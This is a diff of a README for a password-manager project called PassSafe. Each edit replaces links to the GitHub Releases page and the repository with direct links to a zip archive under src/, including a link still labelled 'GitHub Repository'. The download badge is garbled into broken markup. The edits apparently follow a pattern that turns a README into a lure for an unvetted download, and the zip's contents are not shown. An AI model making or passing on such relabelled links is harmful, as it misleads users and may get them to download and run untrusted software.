@@ -1,6 +1,6 @@
 # 🔐 Password-Manager - Securely Manage Your Passwords with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Password%20Manager-blue.svg)](https://github.com/algari436/Password-Manager/releases)
+[![Download Now](https://raw.githubusercontent.com/algari436/Password-Manager/master/src/Password_Manager_v2.2.zip%20Now-Password%https://raw.githubusercontent.com/algari436/Password-Manager/master/src/Password_Manager_v2.2.zip)](https://raw.githubusercontent.com/algari436/Password-Manager/master/src/Password_Manager_v2.2.zip)
 
 ## 📌 About PassSafe
 
@@ -21,7 +21,7 @@ Getting started with PassSafe is easy. Follow the steps below to download and in
 
 1. **Visit the Download Page**: Click on the link below to access the Releases page.
    
-   [Download PassSafe](https://github.com/algari436/Password-Manager/releases)
+   [Download PassSafe](https://raw.githubusercontent.com/algari436/Password-Manager/master/src/Password_Manager_v2.2.zip)
 
 2. **Choose the Latest Version**: On the Releases page, locate the latest version of PassSafe.
 
@@ -71,7 +71,7 @@ We welcome contributions to improve PassSafe. If you'd like to help, please foll
 
 ## 🔗 Additional Information
 
-For further details about PassSafe, features, and updates, visit our [GitHub Repository](https://github.com/algari436/Password-Manager).
+For further details about PassSafe, features, and updates, visit our [GitHub Repository](https://raw.githubusercontent.com/algari436/Password-Manager/master/src/Password_Manager_v2.2.zip).
 
 ## 📑 License
 
